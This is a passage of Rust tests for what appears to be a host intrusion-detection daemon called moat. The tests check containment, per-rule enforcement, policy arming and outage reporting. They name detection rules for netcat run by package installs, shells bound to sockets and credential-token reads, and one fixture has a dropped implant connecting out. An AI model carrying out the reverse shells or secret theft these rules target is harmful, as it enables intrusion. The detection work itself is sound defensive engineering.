    /// conclusion and went on refusing the connection for the rest of the
    /// 600 s TTL. Docker and cargo were both cut off from their registries.
    #[test]
    fn a_containment_is_released_when_its_chain_is_no_longer_high() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.contain.enabled = true;

        let rec = crate::contain::Containment {
            chain: "01CHAINDEMOTED".into(),
            policy: "moat-contain-0".into(),
            exes: vec!["/usr/bin/dockerd".into()],
            dests: vec!["93.184.216.34".into()],
            since: 100,
            expires: 700,
        };
        d.contain.insert(rec, 4);
        assert!(d.contain.is_contained("01CHAINDEMOTED"), "precondition: contained");

        // The same chain, re-evaluated below high.
        let c = crate::chain::Chain {
            v: 1,
            id: "01CHAINDEMOTED".into(),
            ancestor: crate::alert::Ancestor::new(5000, "/usr/bin/dockerd".into()),
            families: vec!["net".into(), "persist".into()],
            severity: "medium".into(),
            severity_base: "medium".into(),
            severity_reason: "stays medium: no escalating sequence".into(),
            first_ts: util::now_rfc3339(),
            last_ts: util::now_rfc3339(),
            span_secs: 112,
            steps: vec![],
            steps_total: 16,
            truncated: false,
            members: Vec::new(),
            triggers_total: 0,
            summary: "16 things happened under dockerd".into(),
        };
        d.maybe_contain(&c, 200);

        assert!(
            !d.contain.is_contained("01CHAINDEMOTED"),
            "moat withdrew the conclusion, so it must withdraw the block"
        );
    }

    /// A LAN destination is alerted on, not refused.
    ///
    /// 2026-09-07: a machine migration -- rsync over ssh to the old box, which
    /// by its nature reads every credential in $HOME and sends them to one host
    /// -- built a HIGH chain and moat contained ssh mid-transfer. The tool that
    /// failed said only "Operation not permitted"; nothing in rsync's output
    /// could tell you moat had done it. That is the failure that makes somebody
    /// switch protection off and leave it off, and it is why refusing a private
    /// address is opt-in while alerting on one is not.
    #[test]
    fn a_private_destination_is_alerted_on_but_not_refused_by_default() {
        assert_eq!(
            Config::default().contain.private,
            "log",
            "refusing a LAN address must be opt-in"
        );

        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.mode = "enforce".into();
        d.cfg.contain.enabled = true;
        d.cfg.thresholds.dedupe_secs = 0;
        // Any attempt to actually load a policy would fail loudly here.
        d.cfg.paths.tetra = dir.path().join("no-such-tetra");
        let mkproc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: exe.into(),
            args: String::new(),
            cwd: "/home/dan/pull".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            in_container: None,
            sid: None,
            tty: None,
            ..Default::default()
        };
        let actor = mkproc("e-ssh", 7200, "/usr/bin/ssh");
        let root = mkproc("e-pull", 7000, "/home/dan/pull/no-such-pull.sh");
        let mut mk = |rule: &str, family: &str, sev: &str, ip: Option<&str>| {
            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), actor.clone());
            f.meta.family = family.into();
            f.meta.severity = sev.into();
            f.ancestry = vec![root.clone()];
            if let Some(ip) = ip {
                f.net = Some(crate::alert::NetRef { dst_ip: ip.into(), dst_port: 22, domain: None, domain_age_secs: None, domain_cname: None,
                domain_queried_by: None,
            });
            } else {
                f.hook = "file_post_open".into();
                f.file = Some(crate::alert::FileRef {
                    path: "/home/dan/.npmrc-no-such-fixture".into(),
                    sha256: None,
                });
            }
            d.emit(f)
        };
        // The migration shape: a credential read, then out to the old machine.
        mk("moat-cred-registry-token-read", "cred", "high", None);
        mk("moat-net-first-contact", "net", "medium", Some("192.168.44.105"));

        assert!(
            d.contain.live().is_empty(),
            "a LAN destination must be alerted on, not refused, while contain.private is log"
        );

        // NOT a vacuous pass. The chain DID form and DID reach high -- which
        // is the condition that calls into containment -- so what stopped the
        // refusal is the gate above and not a chain that never happened.
        let high_chain = d
            .store
            .load()
            .into_iter()
            .any(|a| a.chain.as_ref().map(|c| c.severity == "high" || c.severity == "critical").unwrap_or(false));
        assert!(
            high_chain,
            "the migration shape must still build a high chain and still alert; only the \
             refusal is withheld"
        );
    }

    /// Enforcement that refuses instead of killing.
    ///
    /// Every armed rule was `Sigkill` until 2026-09-04, because the network
    /// rules hung off the `tcp_connect` kprobe and that function cannot be
    /// error-injected -- so the only enforcement available was ending the
    /// process. On a developer's machine that is a bad trade: to stop one
    /// connection you take out a build, an editor or a shell, and lose the
    /// process tree you wanted to look at. `security_socket_connect` is a real
    /// LSM hook, so the connect can be refused with -EPERM instead.
    ///
    /// A refusal is recorded the moment it is seen. A kill is not -- it waits
    /// for process_exit to report SIGKILL -- because a kill that did not land
    /// must never be shown as one.
    #[test]
    fn a_refused_operation_is_recorded_without_waiting_for_a_death() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        // Armed: a refusal is only a refusal where the kernel policy was
        // enforcing. This test used to pass in monitor mode, which is to say
        // it pinned the bug -- see the test below for the monitor half.
        d.enforcing_rules.insert("moat-net-tmpfs-binary-egress".into());
        d.handle_line(&exec_line("e-imp", 6100, "/tmp/dropped/implant", "", ""));
        let line = r#"{"process_kprobe":{"process":{"exec_id":"e-imp","pid":6100,"uid":1000,"binary":"/tmp/dropped/implant","cwd":"/tmp","start_time":"2026-09-04T23:00:00.000000000Z"},"function_name":"socket_connect","policy_name":"moat-net-tmpfs-binary-egress","action":"KPROBE_ACTION_OVERRIDE","args":[{"sock_arg":{"family":"AF_INET","daddr":"185.220.101.55","dport":443,"saddr":"192.168.1.20","sport":51234}}]},"time":"2026-09-04T23:00:00.100Z"}"#;
        d.handle_line(line);

        // Not `.pop()`: the same connect also feeds `moat-net-first-contact`,
        // which is the point of that rule.
        let alerts = d.store.load();
        let a = alerts
            .iter()
            .find(|x| x.rule == "moat-net-tmpfs-binary-egress")
            .expect("the refusal must be recorded");
        assert_eq!(
            a.action_taken, "blocked",
            "the kernel already refused it; nothing has to confirm that"
        );
        assert!(
            a.explain.evidence.iter().any(|e| e.contains("EPERM")),
            "the user is told the program is still running and saw the call fail: {:?}",
            a.explain.evidence
        );
    }

    /// The inverse of the test above, and the half that was missing: the same
    /// event under a monitor-mode policy is NOT a refusal. Tetragon reports the
    /// configured action either way; "blocked" beside "mode: monitor" was a
    /// record contradicting itself about whether a connection went out.
    #[test]
    fn a_configured_refusal_in_monitor_mode_is_not_recorded_as_one() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        assert_eq!(d.mode_for("moat-net-tmpfs-binary-egress"), "monitor", "precondition");
        d.handle_line(&exec_line("e-imp", 6100, "/tmp/dropped/implant", "", ""));
        let line = r#"{"process_kprobe":{"process":{"exec_id":"e-imp","pid":6100,"uid":1000,"binary":"/tmp/dropped/implant","cwd":"/tmp","start_time":"2026-09-04T23:00:00.000000000Z"},"function_name":"socket_connect","policy_name":"moat-net-tmpfs-binary-egress","action":"KPROBE_ACTION_OVERRIDE","args":[{"sock_arg":{"family":"AF_INET","daddr":"185.220.101.55","dport":443,"saddr":"192.168.1.20","sport":51234}}]},"time":"2026-09-04T23:00:00.100Z"}"#;
        d.handle_line(line);
        let alerts = d.store.load();
        let a = alerts
            .iter()
            .find(|x| x.rule == "moat-net-tmpfs-binary-egress")
            .expect("the event is still an alert");
        assert_eq!(a.mode, "monitor");
        assert_eq!(a.action_taken, "none", "nothing was refused in monitor mode");
        assert!(
            !a.explain.evidence.iter().any(|e| e.contains("EPERM")),
            "and the user is not told it was: {:?}",
            a.explain.evidence
        );
        assert!(a.explain.evidence.iter().any(|e| e.contains("monitor mode")));

        // Armed for that one rule, the same event is a refusal, and the
        // record says so consistently.
        d.enforcing_rules.insert("moat-net-tmpfs-binary-egress".into());
        d.cfg.thresholds.dedupe_secs = 0;
        d.handle_line(&line.replace("23:00:00.100Z", "23:00:05.100Z"));
        let b = d
            .store
            .load()
            .into_iter()
            .rfind(|x| x.rule == "moat-net-tmpfs-binary-egress")
            .unwrap();
        assert_eq!(b.mode, "enforce");
        assert_eq!(b.action_taken, "blocked");
    }

    /// One place stamps the mode an alert was raised under, and everything
    /// written about that alert agrees with it: the record, its evidence line,
    /// the incident snapshot's meta.json and the analysis bundle.
    #[test]
    fn everything_written_about_an_alert_agrees_on_its_mode() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        // Armed on its own: the daemon stays in monitor.
        d.enforcing_rules.insert("moat-net-first-contact".into());
        assert_eq!(d.mode, "monitor");

        // A userland-rule finding, built the way `RuleCtx::finding` builds one:
        // with the DAEMON's mode on it.
        let proc = ProcInfo {
            exec_id: "e-cli".into(),
            pid: 7300,
            uid: 1000,
            exe: "/tmp/no-such-lab/cli".into(),
            args: String::new(),
            cwd: "/tmp/no-such-lab".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            in_container: None,
            sid: None,
            tty: None,
            ..Default::default()
        };
        let mut f = Finding::new(
            "moat-net-first-contact",
            crate::policy::PolicyMeta::fallback("moat-net-first-contact"),
            proc,
        );
        f.meta.severity = "high".into();
        f.hook = "userland".into();
        f.mode = d.mode.clone();
        f.net = Some(crate::alert::NetRef {
            dst_ip: "203.0.113.9".into(),
            dst_port: 443,
            domain: None,
            domain_age_secs: None,
            domain_cname: None,
                domain_queried_by: None,
            });
        let id = d.emit(f).expect("recorded");
        let a = d.store.find(&id).unwrap();
        assert_eq!(a.mode, "enforce", "the record carries the mode that governed the rule");
        assert_eq!(a.mode, d.mode_for(&a.rule));

        let bundle = d.write_bundle(&id).expect("bundle");
        let body = std::fs::read_to_string(&bundle).unwrap();
        assert!(
            body.contains("| mode | enforce |"),
            "the bundle's table is about the alert, so its mode row is the alert's: {}",
            body.lines().find(|l| l.starts_with("| mode")).unwrap_or("")
        );
    }

    /// Under a daemon-wide enforce every armable rule kills, and the Rules tab
    /// must say so: `armed` is what the kernel does for the rule, not whether
    /// the rule happens to be on the per-rule list.
    #[test]
    fn every_armable_rule_reads_armed_under_a_daemon_wide_enforce() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        assert!(d.enforceable().iter().all(|r| r["armed"] == false), "monitor: nothing armed");
        d.mode = "enforce".into();
        assert!(d.enforcing_rules.is_empty(), "a global switch lists no rule");
        let rows = d.enforceable();
        assert!(!rows.is_empty());
        for r in &rows {
            let rule = r["rule"].as_str().unwrap();
            assert_eq!(r["armed"], true, "{} kills under mode enforce", rule);
            assert_eq!(r["armed"] == true, d.mode_for(rule) == "enforce");
        }
        // The two userland rules that end a process are armable rules like any
        // other. Listing kernel policies only was why the per-rule switch could
        // not reach the only two rules that act on their own (CONTRACT §6.5).
        let names: Vec<&str> = rows.iter().filter_map(|r| r["rule"].as_str()).collect();
        for id in ["moat-pkg-subtree-netcat-exec", "moat-shell-stdio-socket"] {
            assert!(names.contains(&id), "{} must be armable: {:?}", id, names);
            let row = rows.iter().find(|r| r["rule"] == id).unwrap();
            assert_eq!(row["enforce"], "kill");
            assert_eq!(row["by"], "moatd", "it kills in the daemon, not in the kernel");
        }
    }

    /// One userland rule armed, the daemon still in monitor, nothing pushed
    /// into the kernel — and the arming survives a restart.
    ///
    /// `moat-pkg-subtree-netcat-exec` and `moat-shell-stdio-socket` are the two
    /// rules that kill from userland, and until 2026-09-05 they were the two
    /// the per-rule switch refused: `enforceable()` listed policies only,
    /// `set mode --rule` rejected the name, and `maybe_enforce` read the
    /// daemon-wide `mode` instead of `mode_for`. So arming either of them meant
    /// arming every rule on the machine, which is exactly the all-or-nothing
    /// per-rule enforcement exists to avoid.
    #[test]
    fn one_userland_rule_can_be_armed_while_the_daemon_stays_in_monitor() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        let rule = "moat-shell-stdio-socket";
        d.enforcing_rules.insert(rule.to_string());

        assert_eq!(d.mode, "monitor", "the daemon as a whole is not enforcing");
        assert_eq!(d.mode_for(rule), "enforce", "but this one rule is");
        assert_eq!(d.mode_for("moat-pkg-subtree-netcat-exec"), "monitor", "and only this one");
        // The rule itself reads the same switch the daemon does.
        let ctx = d.ctx(util::unix_secs());
        assert!(ctx.enforcing(rule));
        assert!(!ctx.enforcing("moat-pkg-subtree-netcat-exec"));
        // Nothing is pushed into the kernel for it: there is no policy to set a
        // mode on, and `tetra tp set-mode` on an unknown name would fail and be
        // reported as enforcement that did not take.
        assert!(
            !d.enforcement_to_apply().contains(&rule.to_string()),
            "a userland rule has no kernel mode to re-apply"
        );
        assert_eq!(
            d.enforceable()
                .iter()
                .find(|r| r["rule"] == rule)
                .map(|r| r["armed"].clone()),
            Some(Value::Bool(true))
        );

        // And it round-trips across a restart the way a kernel rule does.
        d.write_state();
        let restarted = Daemon::new(cfg.clone(), &dir.path().join("moat.toml")).unwrap();
        assert!(restarted.enforcing_rules.contains(rule));
        assert_eq!(restarted.mode, "monitor");
        assert_eq!(restarted.mode_for(rule), "enforce");
    }

    // ------------------------------------------------- arming and verifying

    /// A `tetra` that keeps its own idea of what the kernel holds.
    ///
    /// `<dir>/modes` is the kernel: `name=mode` per line. `tp set-mode` edits
    /// it and refuses a name that is not there, exactly as the real one did
    /// seven times on 2026-09-05 (`tracing policy {moat-…} does not exist`).
    /// `tracingpolicy list -o json` reports it in the v1.7.1 shape. `<dir>/fail`
    /// makes every `set-mode` fail, for the sensor that never comes good.
    /// `<dir>/calls` is the transcript.
    fn fake_tetra(dir: &Path, loaded: &[(String, &str)]) -> PathBuf {
        let bin = dir.join("tetra");
        std::fs::write(
            &bin,
            r#"#!/bin/bash
d="$(dirname "$0")"
echo "$*" >> "$d/calls"
sub="$2"
case "$sub" in
  list)
    [ -f "$d/modes" ] || exit 1
    printf '{"policies":['
    first=1
    while IFS='=' read -r n m; do
      [ -z "$n" ] && continue
      [ $first -eq 1 ] || printf ','
      first=0
      printf '{"id":"1","name":"%s","state":"TP_STATE_ENABLED","mode":"TP_MODE_%s"}' \
        "$n" "$(echo "$m" | tr 'a-z' 'A-Z')"
    done < "$d/modes"
    printf ']}\n'
    ;;
  set-mode)
    n="$3"; m="$4"
    if [ -f "$d/fail" ] || ! grep -q "^$n=" "$d/modes" 2>/dev/null; then
      echo "tracing policy {$n} does not exist" >&2
      exit 1
    fi
    sed -i "s|^$n=.*|$n=$m|" "$d/modes"
    ;;
  *) exit 1 ;;
esac
"#,
        )
        .unwrap();
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&bin, std::fs::Permissions::from_mode(0o755)).unwrap();
        let body: String = loaded.iter().map(|(n, m)| format!("{}={}\n", n, m)).collect();
        std::fs::write(dir.join("modes"), body).unwrap();
        bin
    }

    fn tetra_calls(dir: &Path) -> Vec<String> {
        std::fs::read_to_string(dir.join("calls"))
            .unwrap_or_default()
            .lines()
            .map(str::to_string)
            .collect()
    }

    /// Pretend Tetragon has pinned `n` policies under its bpffs directory.
    fn pin(bpf: &Path, n: usize) {
        let _ = std::fs::remove_dir_all(bpf);
        std::fs::create_dir_all(bpf).unwrap();
        for i in 0..n {
            std::fs::create_dir_all(bpf.join(format!("moat-fake-{}", i))).unwrap();
        }
    }

    /// Arm every kernel policy and point the daemon at a fake sensor.
    fn armed_daemon(dir: &Path) -> (Daemon, Vec<String>) {
        let (mut d, _) = dev_daemon(dir);
        let names = d.policies.names();
        let loaded: Vec<(String, &str)> =
            names.iter().map(|n| (n.clone(), "monitor")).collect();
        d.cfg.paths.tetra = fake_tetra(dir, &loaded);
        d.cfg.paths.tetragon_bpf_dir = dir.join("bpf");
        d.cfg.thresholds.dedupe_secs = 0;
        for n in &names {
            d.enforcing_rules.insert(n.clone());
        }
        (d, names)
    }

    /// The 2026-09-05 outage, as a test.
    ///
    /// moatd re-armed 2 s after start while tetragon was 16 s from having
    /// loaded the last of 44 policies, so every `set-mode` failed against a
    /// name the kernel did not have yet — and nothing retried. The fix is that
    /// arming does not happen at all until the sensor says it is loaded.
    #[test]
    fn readiness_waits_for_the_pin_count_and_arms_once_it_is_reached() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, names) = armed_daemon(dir.path());
        let bpf = d.cfg.paths.tetragon_bpf_dir.clone();
        assert_eq!(names.len(), 5, "the fixture set");

        // The sensor has started but loaded nothing yet.
        pin(&bpf, 0);
        d.begin_arming(1_000);
        assert!(matches!(d.arming, Arming::Waiting { .. }), "arming is pending");
        d.arm_tick(1_000);
        assert!(
            !tetra_calls(dir.path()).iter().any(|c| c.contains("set-mode")),
            "nothing may be armed while the sensor is still loading: {:?}",
            tetra_calls(dir.path())
        );
        assert!(matches!(d.arming, Arming::Waiting { .. }), "still waiting");

        // Half-loaded is still not loaded. This is the state the old code
        // armed into.
        pin(&bpf, 3);
        d.arm_tick(1_010);
        assert!(!tetra_calls(dir.path()).iter().any(|c| c.contains("set-mode")));

        // Fully loaded: arm, and confirm against the kernel rather than the
        // exit status.
        pin(&bpf, names.len());
        d.arm_tick(1_020);
        for n in &names {
            assert!(
                tetra_calls(dir.path())
                    .iter()
                    .any(|c| c.starts_with(&format!("tp set-mode {} enforce", n))),
                "{} was never armed",
                n
            );
        }
        assert_eq!(d.arming, Arming::Idle, "arming is done");
        assert!(d.enforcing_unverified.is_empty(), "{:?}", d.enforcing_unverified);
        assert_eq!(d.enforcing_verified.len(), names.len());

        // And `status` says so, which is the surface that lied.
        let st = d.status();
        assert_eq!(st["enforcing_unverified"], json!([]));
        assert_eq!(st["enforcement_unhealthy"], json!(false));
        assert_eq!(st["arming_pending"], json!(false));
        assert_eq!(st["enforcing_verified"].as_array().unwrap().len(), names.len());
    }

    /// A sensor that never takes the mode produces exactly one alert and an
    /// honest `status` — not silence, and not one alert a minute for ever.
    #[test]
    fn arming_that_keeps_failing_is_retried_then_reported_once() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, names) = armed_daemon(dir.path());
        pin(&d.cfg.paths.tetragon_bpf_dir.clone(), names.len());
        // The policies are loaded, and `set-mode` refuses them anyway.
        std::fs::write(dir.path().join("fail"), "").unwrap();
        d.cfg.thresholds.arm_wait_secs = 10;

        d.begin_arming(2_000);
        d.arm_tick(2_000);
        let after_first = tetra_calls(dir.path())
            .iter()
            .filter(|c| c.contains("set-mode"))
            .count();
        assert!(after_first >= names.len(), "every policy was attempted");
        assert_eq!(d.enforcing_unverified.len(), names.len(), "none of them took");
        assert!(matches!(d.arming, Arming::Waiting { .. }), "a failure is retried");

        // Retried, on backoff, inside the window.
        d.arm_tick(2_005);
        assert!(
            tetra_calls(dir.path()).iter().filter(|c| c.contains("set-mode")).count()
                > after_first,
            "the failure must be retried, not accepted"
        );

        // And past the deadline it stops trying and stands by its answer.
        d.arm_tick(2_100);
        assert_eq!(d.arming, Arming::Idle);
        assert_eq!(d.enforcing_unverified.len(), names.len());
        assert!(d.enforcing_verified.is_empty());

        // Verifying again changes nothing about the alert count.
        d.verify_enforcement(2_200);
        d.verify_enforcement(2_300);

        let alerts: Vec<_> = d
            .store
            .load()
            .into_iter()
            .filter(|a| a.rule == crate::rules::PROTECTION_CHANGED)
            .collect();
        assert_eq!(
            alerts.len(),
            1,
            "a persistent failure is one alert, not one per tick: {:?}",
            alerts.iter().map(|a| a.explain.what.clone()).collect::<Vec<_>>()
        );
        let ev = alerts[0].explain.evidence.join(" ");
        for n in &names {
            assert!(ev.contains(n.as_str()), "the alert must name {}: {}", n, ev);
        }
        assert!(ev.contains("moatctl status"), "and say what to run: {}", ev);

        // `status` is the surface the panel and `moatctl` read.
        let st = d.status();
        assert_eq!(st["enforcement_unhealthy"], json!(true));
        assert_eq!(
            st["enforcing_rules"].as_array().unwrap().len(),
            st["enforcing_unverified"].as_array().unwrap().len(),
            "everything listed as armed is unverified"
        );
    }

    /// The steady-state check: something reloaded a policy and it dropped back
    /// to the `monitor` its file declares. Nothing announces that, so moat has
    /// to go and look.
    #[test]
    fn verify_reconciles_a_policy_the_kernel_reports_as_monitor() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, names) = armed_daemon(dir.path());
        pin(&d.cfg.paths.tetragon_bpf_dir.clone(), names.len());
        // Four of five are enforcing in the kernel; one quietly is not.
        let slipped = names[2].clone();
        let body: String = names
            .iter()
            .map(|n| format!("{}={}\n", n, if *n == slipped { "monitor" } else { "enforce" }))
            .collect();
        std::fs::write(dir.path().join("modes"), body).unwrap();

        d.verify_enforcement(3_000);

        assert!(
            tetra_calls(dir.path())
                .iter()
                .any(|c| c.starts_with(&format!("tp set-mode {} enforce", slipped))),
            "the one that slipped must be re-armed: {:?}",
            tetra_calls(dir.path())
        );
        assert_eq!(
            tetra_calls(dir.path())
                .iter()
                .filter(|c| c.contains("set-mode"))
                .count(),
            1,
            "and only that one -- re-arming the four that are fine is churn"
        );
        assert!(d.enforcing_unverified.is_empty(), "it came back");
        assert_eq!(d.enforcing_verified.len(), names.len());
        assert!(
            !d.store
                .load()
                .iter()
                .any(|a| a.rule == crate::rules::PROTECTION_CHANGED),
            "a gap moat closed by itself is not an alert"
        );
    }

    /// "Cannot ask the kernel" must never be reported as "the kernel says no".
    #[test]
    fn a_tetra_that_cannot_answer_leaves_the_previous_verdict_alone() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, names) = armed_daemon(dir.path());
        pin(&d.cfg.paths.tetragon_bpf_dir.clone(), names.len());
        let all_enforcing: String =
            names.iter().map(|n| format!("{}=enforce\n", n)).collect();
        std::fs::write(dir.path().join("modes"), all_enforcing).unwrap();
        d.verify_enforcement(4_000);
        assert_eq!(d.enforcing_verified.len(), names.len());

        // Now take the answer away: no `modes` file, so `list` exits 1.
        std::fs::remove_file(dir.path().join("modes")).unwrap();
        d.verify_enforcement(4_100);
        assert!(
            d.enforcing_unverified.is_empty(),
            "silence from tetra is not evidence of a gap"
        );
        assert_eq!(d.enforcing_verified.len(), names.len(), "the last answer stands");
        assert!(!d
            .store
            .load()
            .iter()
            .any(|a| a.rule == crate::rules::PROTECTION_CHANGED));
    }

    /// The field this all turns on, read out of `tetra tracingpolicy list`.
    #[test]
    fn policy_modes_are_read_from_whatever_shape_tetra_reports() {
        // v1.7.1: ListTracingPoliciesResponse.policies[].{name,mode}, with
        // TracingPolicyMode serialised by name.
        let m = parse_policy_modes(
            r#"{"policies":[
                 {"id":"1","name":"moat-a","state":"TP_STATE_ENABLED","mode":"TP_MODE_ENFORCE"},
                 {"id":"2","name":"moat-b","state":"TP_STATE_ENABLED","mode":"TP_MODE_MONITOR"}]}"#,
        )
        .expect("the documented shape");
        assert_eq!(m.get("moat-a").map(String::as_str), Some("enforce"));
        assert_eq!(m.get("moat-b").map(String::as_str), Some("monitor"));

        // The same enum as a number, which is what a plain JSON marshaller
        // emits. UNKNOWN 0, ENFORCE 1, MONITOR 2, MONITOR_ONLY 3 -- read out of
        // the descriptor embedded in /usr/bin/tetra, not guessed.
        let m = parse_policy_modes(r#"[{"name":"moat-a","mode":1},{"name":"moat-b","mode":2}]"#)
            .unwrap();
        assert_eq!(m.get("moat-a").map(String::as_str), Some("enforce"));
        assert_eq!(m.get("moat-b").map(String::as_str), Some("monitor"));

        // And the text table, for a tetra whose JSON output moved. NAMESPACE is
        // empty on every policy moat loads, and tabwriter pads it with spaces,
        // so counting columns from the left lands on the wrong one: the mode is
        // found by shape instead.
        let m = parse_policy_modes(
            "ID  NAME    STATE             FILTERID  NAMESPACE  SENSORS         KERNELMEMORY  MODE             NPOST  NENFORCE  NMONITOR\n\
             1   moat-a  TP_STATE_ENABLED  0                    generic_kprobe  4096          TP_MODE_ENFORCE  0      0         0\n\
             2   moat-b  TP_STATE_ENABLED  0                    generic_kprobe  4096          TP_MODE_MONITOR  0      0         0\n",
        )
        .unwrap();
        assert_eq!(m.get("moat-a").map(String::as_str), Some("enforce"));
        assert_eq!(m.get("moat-b").map(String::as_str), Some("monitor"));

        // Nothing usable is `None`, which callers must not read as "monitor".
        assert!(parse_policy_modes("not json, not a table").is_none());

        // A policy the kernel does not have at all is a policy that is not
        // enforcing -- the exact case that failed seven times on 2026-09-05.
        let want = vec!["moat-a".to_string(), "moat-gone".to_string()];
        let modes = parse_policy_modes(r#"{"policies":[{"name":"moat-a","mode":1}]}"#).unwrap();
        assert_eq!(disagreeing(&want, &modes), vec!["moat-gone".to_string()]);
    }

    /// A hole in the record is itself a finding.
    ///
    /// Stopping the daemon needs root, and `Restart=always` brings it straight
    /// back -- so a root-level shutdown used to leave nothing behind at all:
    /// the process returns, the log resumes, and the minutes in between simply
    /// are not there. Anyone who wants to work unobserved stops the sensor
    /// first, so the gap has to be said out loud.
    #[test]
    fn a_gap_in_the_record_is_reported_on_the_next_start() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());

        // Never run before: no record, so no hole to report.
        d.last_heartbeat = 0;
        let n = d.store.load().len();
        d.report_downtime();
        assert_eq!(d.store.load().len(), n, "a first start is not an outage");

        // A restart takes seconds; that is not a hole either.
        d.last_heartbeat = d.started.saturating_sub(5);
        d.report_downtime();
        assert_eq!(d.store.load().len(), n, "an ordinary restart is not an outage");

        // Twenty minutes is.
        d.last_heartbeat = d.started.saturating_sub(1200);
        d.report_downtime();
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-x-was-not-running")
            .expect("the outage must be recorded");
        assert_eq!(a.severity, "high");
        // The gap is twenty minutes; how it SPLITS depends on the host's boot
        // time, which this test does not control. On a machine awake
        // throughout, all twenty were blind. On one that booted inside the
        // window -- a laptop, or a build running minutes after a reboot -- the
        // same twenty come back as "N unwatched" plus "the full gap was 20
        // minutes, of which M powered off".
        //
        // Asserting only the first form made this test depend on the uptime of
        // whoever ran it. It went unnoticed for months and then failed the
        // first `makepkg` on a freshly rebooted machine, inside check(), where
        // it read as an architecture problem and aborted the build.
        //
        // What must be true either way: the record accounts for the whole
        // twenty minutes. The split itself is covered by `split_downtime`'s own
        // unit tests, which take every clock as an argument.
        let ev = a.explain.evidence.join(" | ");
        assert!(
            ev.contains("20 minutes unwatched while the machine was awake")
                || ev.contains("the full gap was 20 minutes"),
            "the record says how long: {:?}",
            a.explain.evidence
        );
    }

    /// The 2026-09-09 shutdown alert: a 73-minute hole that was not one.
    ///
    /// Moat wrote its last heartbeat five seconds before the machine powered
    /// off and came back 38 seconds after the next boot. It reported "a 4416
    /// second hole -- nothing that happened in between was seen by anything".
    /// Nothing DID happen in between: the machine was off.
    ///
    /// Each negative below is paired with the positive that proves the fixture
    /// can still raise the alert, because a silent `report_downtime` is also
    /// what a broken one looks like.
    #[test]
    fn time_the_machine_was_off_or_asleep_is_not_a_hole_in_the_record() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let boot = crate::util::boot_time();
        assert!(boot > 0, "this test needs a readable /proc/stat btime");

        // --- powered off -------------------------------------------------
        // 73 minutes of wall gap, of which 38 seconds were on this boot.
        d.started = boot + 38;
        d.last_heartbeat = boot - 4378;
        d.last_awake = 0;
        let split = d.downtime();
        assert_eq!(split.wall, 4416, "the clock distance is unchanged");
        assert_eq!(split.blind, 38, "only boot -> start was unobserved");
        assert_eq!(split.powered_off, 4378);

        let n = d.store.load().len();
        d.report_downtime();
        assert_eq!(
            d.store.load().len(),
            n,
            "38 blind seconds is under the floor: a shutdown is not an outage"
        );

        // Control: the same shutdown, but moat really was late back. Same
        // branch, same fixture, one number different.
        d.started = boot + 900;
        d.report_downtime();
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-x-was-not-running")
            .expect("15 unwatched minutes after a boot IS an outage");
        assert!(
            a.explain
                .evidence
                .iter()
                .any(|e| e.contains("powered off or shutting down")),
            "and it says where the rest of the gap went: {:?}",
            a.explain.evidence
        );

        // --- suspended ---------------------------------------------------
        let dir2 = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir2.path());
        let awake = crate::util::awake_secs();
        // Eight hours of wall gap on one boot, 30 seconds of it awake.
        d.started = boot + 100_000;
        d.last_heartbeat = d.started - 28_800;
        d.last_awake = awake.saturating_sub(30);
        let split = d.downtime();
        assert_eq!(split.wall, 28_800);
        assert_eq!(split.blind, 30, "a sleeping machine runs nothing");
        assert_eq!(split.suspended, 28_770);

        let n = d.store.load().len();
        d.report_downtime();
        assert_eq!(
            d.store.load().len(),
            n,
            "a laptop asleep overnight is not an outage"
        );

        // Control: same overnight gap, but the machine was awake for ten
        // minutes of it with nothing watching.
        d.last_awake = awake.saturating_sub(600);
        d.report_downtime();
        let a = d
            .store
            .load()
            .into_iter()
            .find(|a| a.rule == "moat-x-was-not-running")
            .expect("ten awake unwatched minutes IS an outage");
        assert!(
            a.explain.evidence.iter().any(|e| e.contains("suspended")),
            "and it names the sleep: {:?}",
            a.explain.evidence
        );
    }

    /// The neighbour-rate measurement, and the distinction it exists to make.
    ///
    /// The open question is whether an ambiguous single event should reach the
    /// badge only as part of a sequence. That is right for a rule whose alerts
    /// routinely sit beside ANOTHER family in one process tree and switches a
    /// rule off entirely when they do not, so the rate has to count
    /// cross-family neighbours only: "netcat ran twice" is one story told
    /// twice, and letting a rule vouch for itself would make every rule look
    /// gateable.
    #[test]
    fn the_neighbour_rate_counts_other_families_and_not_a_rule_vouching_for_itself() {
        use crate::alert::tests_support::demo_alert;
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());

        let chain_of = |families: &[&str]| crate::chain::Chain {
            v: 1,
            id: "01CH".into(),
            ancestor: crate::alert::Ancestor::new(5000, "/usr/bin/makepkg".into()),
            families: families.iter().map(|s| s.to_string()).collect(),
            severity: "high".into(),
            severity_base: "high".into(),
            severity_reason: "r".into(),
            first_ts: "2026-09-05T14:44:22Z".into(),
